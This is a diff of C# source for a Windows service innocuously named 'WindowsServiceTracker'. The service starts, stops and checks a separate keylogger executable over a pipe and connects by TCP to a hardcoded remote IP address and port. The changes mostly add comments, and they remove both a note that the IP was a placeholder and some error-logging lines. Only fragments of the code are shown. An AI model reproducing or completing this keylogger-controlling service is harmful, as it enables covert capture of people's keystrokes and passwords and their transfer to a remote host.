@@ -26,13 +26,13 @@ namespace WindowsServiceTracker
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
-        private const long IP_ADDRESS = 0x6c3911ac; //127.0.0.1 as placeholder
+        private const long IP_ADDRESS = 0x6c3911ac;
         private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
-        private const string EXTERNAL_PROCESS = "..\\..\\..\\WTKL\\bin\\Debug\\WTKL.exe";
 
+        //Variables
         private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
         private volatile TcpClient tcp;
         private NetworkStream tcpStream;
@@ -53,6 +53,9 @@ namespace WindowsServiceTracker
             }
         }
 
+        /* This method is the first method to be ran when the service starts running. For pretty
+         * much all intents and purposes this is simply the main method.
+         */
         protected override void OnStart(string[] args)
         {
             //Use the following line to launch an instance of visual studio to debug
@@ -74,6 +77,9 @@ namespace WindowsServiceTracker
             tcpThread.Start();
         }
 
+        /*This method runs immediately before the service stops and shuts down. So all writing to
+        * config/settings files and closing connections should be done here.
+         */
         protected override void OnStop()
         {
             StopKeylogger();
@@ -85,11 +91,15 @@ namespace WindowsServiceTracker
             }
         }
 
+        /*Creates the pipe over which keylogger functions can be called. Functions are called
+        * using pipeProxy.FunctionName();
+         */
         private void CreateOpenPipe()
         {
             pipeProxy = pipeFactory.CreateChannel();
         }
 
+        //Starts the keylogger
         public bool StartKeylogger()
         {
             if (CheckIfRunning())
@@ -99,6 +109,7 @@ namespace WindowsServiceTracker
             return false;
         }
 
+        //Stops the keylogger
         public bool StopKeylogger()
         {
             if (CheckIfRunning())
@@ -108,6 +119,7 @@ namespace WindowsServiceTracker
             return false;
         }
 
+        //Checks to see if the keylogger program is running
         public bool CheckIfRunning()
         {
             try
@@ -231,9 +243,6 @@ namespace WindowsServiceTracker
             }
             catch (Exception)
             {
-                //Another write to the Windows Event Logs, shows up in the same place as before but as type "Error" instead of type "Information"
-                //string error = "Service failed to connect to IP address " + IP_ADDRESS + " on port " + PORT;
-                //EventLog.WriteEntry(ERROR_LOG_SOURCE, error, EventLogEntryType.Error);
                 throw new Exception("Error connecting");
             }
             //return false;
